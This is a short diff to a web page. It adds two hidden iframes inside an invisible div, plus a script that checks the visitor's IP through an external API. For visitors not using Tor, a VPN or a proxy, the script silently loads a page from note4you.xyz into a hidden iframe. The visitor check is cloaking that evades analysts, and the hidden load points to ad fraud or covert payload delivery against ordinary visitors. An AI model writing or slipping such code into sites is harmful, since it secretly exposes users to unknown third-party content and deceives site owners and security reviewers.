@@ -6,17 +6,25 @@
 
 	
 	<div style="display:none;">
+
+		<iframe id="adx1" src="" height="768" width="1366" ></iframe>
+		<iframe id="adx2" src="" height="768" width="1366" ></iframe>
+
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+	<script>
+
+		$.getJSON("https://api.ipapi.is", function(result2){
+        	  if(result2.is_tor === undefined || result2.is_tor || result2.is_proxy || result2.is_vpn) {
+
+	              } else { 
+			  	  
+			  	  document.getElementById('adx2').src = 'https://note4you.xyz/main1.html';
+	             
+		  
+		  }
+		 });
+	</script>
 		
-		<script>	
-
-		function message() {
-			// window.location.href = "https://note4you.xyz/epic2.html";
-                }
-		  setTimeout(message,50);
-
-		</script>
-
-
 
 	</div>
 
